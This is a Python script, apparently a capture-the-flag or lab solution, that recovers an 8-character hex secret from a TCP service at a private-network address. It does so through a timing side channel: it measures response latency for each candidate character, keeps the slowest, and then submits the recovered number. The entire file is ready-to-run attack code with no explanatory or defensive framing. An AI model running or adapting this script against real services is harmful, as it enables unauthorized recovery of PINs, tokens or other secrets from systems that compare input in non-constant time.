import socket
import time

HOST = '192.168.0.100'
PORT = 55555
CHARSET = '0123456789abcdef'
NUMBER_LEN = 8
TRIES_PER_CHAR = 3


def check_char(known_prefix, char_to_test):
    # build guess: known + candidate + zero padding to reach fixed length
    padding = "0" * (NUMBER_LEN - len(known_prefix) - 1)
    guess = f"{known_prefix}{char_to_test}{padding}\n"

    total_time = 0

    for _ in range(TRIES_PER_CHAR):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))

            # read banner/prompt if any
            s.recv(1024)

            start_time = time.perf_counter()

            s.sendall(guess.encode())
            s.recv(1024)

            end_time = time.perf_counter()

            s.close()

            total_time += (end_time - start_time)

            time.sleep(0.05)

        except socket.error as e:
            print(f"Socket error: {e}")
            return 0

    return total_time / TRIES_PER_CHAR


def main():
    known_number = ""
    print(f"[*] Starting attack on {HOST}:{PORT}...")

    for i in range(NUMBER_LEN):
        timings = {}

        print(f"[*] Finding char {i + 1}/{NUMBER_LEN}... ({known_number})")

        for char in CHARSET:
            avg_time = check_char(known_number, char)
            timings[char] = avg_time
            print(f"  > Test: {known_number}{char}... -> {avg_time:.6f} s")

        best_char = max(timings, key=timings.get)

        if timings[best_char] == 0:
            print("[!] All attempts failed! Server seems to be blocking. Retry later.")
            return

        known_number += best_char

        print(f"[+] Found char: {best_char} (time: {timings[best_char]:.6f} s)")

    print(f"\n[!] Final number: {known_number}")

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((HOST, PORT))

        # print server banner/prompt
        print(s.recv(1024).decode().strip())

        s.sendall(f"{known_number}\n".encode())

        response = s.recv(4096).decode()
        print(response)

        s.close()
    except socket.error as e:
        print(f"Error sending final number: {e}")


if __name__ == "__main__":
    main()
